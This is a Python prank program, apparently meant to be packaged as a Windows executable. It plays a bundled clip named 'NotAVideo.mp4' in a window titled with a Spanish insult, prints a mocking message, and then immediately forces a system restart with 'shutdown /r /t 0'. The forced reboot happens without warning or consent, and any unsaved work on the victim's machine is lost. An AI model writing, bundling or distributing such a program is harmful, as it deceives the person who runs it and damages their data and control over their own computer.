import cv2
import subprocess
import threading
import os
import time
import sys

# Determine if the app is running as a bundled executable
if getattr(sys, 'frozen', False):
    base_dir = sys._MEIPASS  # Temporary directory for bundled files
else:
    base_dir = os.path.dirname(os.path.abspath(__file__))

video_name = "NotAVideo.mp4"
video_path = os.path.join(base_dir, video_name)

def play_audio():
    # For ffplay to work in the bundled app, bundle it too (see notes below)
    ffplay_path = os.path.join(base_dir, "ffplay.exe")  # If bundling ffplay
    subprocess.call([ffplay_path, '-nodisp', '-autoexit', video_path])

audio_thread = threading.Thread(target=play_audio)
audio_thread.start()

# OpenCV video playback
cap = cv2.VideoCapture(video_path)
video_completed = False

while cap.isOpened():
    ret, frame = cap.read()
    if not ret:
        video_completed = True
        break
    cv2.imshow('YA MAMASTE PERROOO', frame)
    if cv2.waitKey(25) & 0xFF == ord('q'):
        break

cap.release()
cv2.destroyAllWindows()

if video_completed:
    audio_thread.join()
    print("Ni pedo, para que lo ejecutas we...")
    time.sleep(1)
    os.system("shutdown /r /t 0")